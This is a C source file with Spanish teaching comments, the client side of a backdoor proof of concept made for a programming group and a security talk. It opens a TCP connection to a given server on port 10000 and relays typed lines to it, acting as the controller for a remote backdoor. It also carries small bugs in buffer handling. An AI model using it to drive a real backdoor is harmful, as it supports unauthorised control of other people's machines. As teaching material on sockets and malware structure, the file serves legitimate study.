/**
 *  client_backdoor.c
 *
 *  Ejemplo de Puerta Trasera en C.
 *  Parte del Cliente.
 *
 *  Autor: Secu <secury@stationx11.es>
 *
 *  Desarrollado para el grupo de Programación
 *  en C de la seCta, y usado como PoC para la
 *  BitUp Talks18.
 *
 *  [+] Código en:
 *
 *  https://github.com/secu77/La-seCta/Malware/client_backdoor.c
 *
 *  [+] Referencias:
 *
 *  https://github.com/secu77/La-seCta/
 *  https://github.com/secu77/La-seCta/blob/master/hangouts/sockets_1/teoria/socketsordie.pdf
 *
 *	[+] Ejecución:
 *
 *  [zero@x11 seCta]$ gcc -Wall client_backdoor.c -o client_backdoor
 *  [zero@x11 seCta]$ ./client_backdoor
 *
 */


#include <stdio.h>				// La Principal, de siempre.
#include <stdlib.h>				// Para los exit().
#include <string.h>				// Para memset() y strlen().

#include <sys/socket.h>			// Para los sockets (pero puede omitirse).
#include <arpa/inet.h>			// Para INADDR_ANY, inet_ntoa() y las estructuras de sockets.

#include <netdb.h>				// Para gethostbyname().
#include <unistd.h>				// Para la pipe(), close().

#define PUERTO 10000			// Puerto de escucha por defecto.
#define MAXDATAMSG 2056			// Tamaño máximo del mensaje a recibir y mandar.



int main(int argc, char *argv[]){

	int fd = 0;					// Descriptor para el Socket Servidor.

	unsigned int bytes = 0;		// Para el nº de bytes que recibirá por el `fd`.

	char msg[MAXDATAMSG];		// 2056 bytes para el Buffer del mensaje a recibir.
	char sent[MAXDATAMSG];		// 2056 bytes para el Buffer del mensaje a enviar.

	struct hostent *rec;		// Estructura que contiene los datos del DNS o IP.
	struct sockaddr_in sckcli;	// Estructura para el Socket Servidor.


	// Mera comprobación de parámetros.
	if (argc != 2){
		printf("\n[*]Uso: %s <SERVER IP>\n", argv[0]);
		exit(-1);
	}


	/*
	 *	A pesar de que las páginas MAN nos dice que
	 *	dicha función esta obsoleta, para este ejemplo
	 *	nos servirá sin problema.
	 *
	 *	Esta función nos devolverá una estructura
	 *	`hostent` que contiene una serie de datos
	 *	del nombre del equipo que le hemos pasado.
	 *	En este caso será la IP pasada o DNS.
	 *
	 *	Es decir, si yo pongo localhost, a partir
	 *	de ese DNS, me va a obtener la dirección IP.
	 *
	 */
	if ((rec = gethostbyname(argv[1])) == NULL){
		perror("gethostbyname()");
	}



	/*
	 *	Se crea el Socket, del tipo SOCK_STREAM para
	 *	conexiones TCP a través de Internet.
	 *
	 *	Se guarda el descriptor del socket (fichero),
	 *	para poder escribir posteriormente sobre él.
	 *
	 */
	if ((fd = socket(AF_INET, SOCK_STREAM,0)) == -1){
		perror("socket()");
	}


	/*
	 *	Rellenando la estructura de
	 *	datos que nos servirán para
	 *	conectarnos al Socket del Servidor.
	 *
	 */
	sckcli.sin_family = AF_INET;							// AF_INET para conexiones a Internet.
	sckcli.sin_port = htons(PUERTO);						// Puerto a Bytes de Red.
	sckcli.sin_addr = *((struct in_addr *)rec->h_addr);		// Coloca la IP del Server.
	memset(sckcli.sin_zero,0,8);							// Rellenamos con ceros.


	/*
	 *	Cuando nosotros tengamos el Socket en el
	 *	Servidor a la escucha, y nuestro Socket
	 *	del Servidor creado, podemos establecer
	 *	una conexión entre ambos. El Socket del
	 *	Servidor será el encargado de Aceptar esa
	 *	solicitud de conexión y para ello, necesitamos
	 *	utilizar la función connect, especificando
	 *	el descriptor de nuestro Socket Servidor, la
	 *	estructura que hemos creado para él y el tamaño.
	 *
	 */
	if(connect(fd,(struct sockaddr *) &sckcli, sizeof(struct sockaddr)) == -1){
		perror("connect()");
	} else {
		printf("\n[*] Conectado al Servidor: %s !\n",inet_ntoa(sckcli.sin_addr));
	}


	while(1){

		/*
		 *	Se mantiene el flujo en espera en esta
		 *	parte porque (además de no ser un socket
		 *	non-blocking), aguarda a recibir el mensaje
		 *	por parte del Servidor. Y cuando lo reciba,
		 *	guardará el mensaje en el buffer `msg`
		 *	y el nº de bytes leidos en `bytes`.
		 *
		 */
		if((bytes = recv(fd,msg,MAXDATAMSG,0)) == -1){
			perror("recv()");
		}else{


			msg[bytes]='\0';	// Cerrando cadena.
			
			// Mostrando la Respuesta del Servidor.
			printf("< [Server]: \n\n%s\n", msg);
			printf("> [You]: ");
			
			// Limpiando el Buffer del Mensaje del Servidor.
			memset(msg,0,sizeof(msg));

			
			/*
			 *	Fgets es una función a la que pasando:
			 *	En primer lugar, el buffer sobre el que
			 *	guardar lo que se escriba, el tamaño de
			 *	ese buffer, y el FILE* o stream de entrada,
			 *	en este caso STDIN (descriptor 0).
			 *
			 *	Podemos leer del teclado una cadena y meterla
			 *	en una variable que la almacene.
			 *
			 */
			fgets(sent, sizeof(sent), stdin);


			/*
			 *	Se envia/escribe en el descriptor del
			 *	Socket del Servidor, el contenido del
			 *	buffer `sent`. Una vez hecho esto,
			 *	el Servidor en su `recv` obtendrá el
			 *	contenido del mensaje que nosotros
			 *	hemos enviado a través de esta función.
			 *
			 *	(Ahora no lo vamos a utilizar, pero esta
			 *	función, al igual que recv, devuelve el
			 *	nº de bytes, en este caso, escritos o enviados).
			 *
			 */
			if((send(fd, sent, sizeof(sent), 0)) == -1){
				perror("send()");
			}
		}
	}
	
	// Cerrando el Descriptor del Socket.
	close(fd);

	return 0;
}